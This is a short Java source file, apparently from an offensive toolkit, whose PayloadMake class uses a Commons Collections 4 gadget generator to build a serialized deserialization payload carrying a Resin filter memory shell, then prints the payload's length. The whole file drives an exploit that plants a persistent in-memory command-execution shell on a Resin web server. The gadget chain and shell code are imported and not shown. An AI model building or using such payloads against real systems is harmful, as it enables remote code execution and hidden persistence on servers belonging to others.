package org.example.utils;

import org.example.memshell.ResinFilterExecMS;
import org.example.memshell.ResinListenerExecMS;
import org.example.memshell.ResinServletExecMS;
import org.tools.ser.CC4Generator;

/**
 * @author Whoopsunix
 */
public class PayloadMake {
    public static void main(String[] args) throws Exception {
        System.out.println("------------");
        cc4();
    }

    public static void cc4() throws Exception {
        CC4Generator cc4Generator = new CC4Generator();
        String payload = cc4Generator.make(ResinFilterExecMS.class);
        System.out.println(payload.length());
    }

}
